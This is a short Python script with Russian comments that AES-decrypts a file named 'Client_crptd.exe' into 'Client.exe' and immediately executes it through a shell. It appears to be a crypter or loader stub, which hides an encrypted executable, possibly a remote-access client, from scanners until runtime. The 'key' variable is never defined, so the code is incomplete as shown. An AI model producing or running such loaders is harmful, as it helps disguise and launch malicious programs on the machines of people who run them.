import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_file(input_file, output_file, key):
    # Чтение зашифрованных данных
    with open(input_file, 'rb') as f:
        iv = f.read(AES.block_size)
        encrypted_data = f.read()

    # Дешифровка данных
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    # Запись расшифрованных данных в выходной файл
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

def run_decrypted_program(file_path):
    # Запуск расшифрованной программы
    subprocess.run(file_path, shell=True)

# Пример использования
decrypt_file('Client_crptd.exe', 'Client.exe', key)
run_decrypted_program('Client.exe')
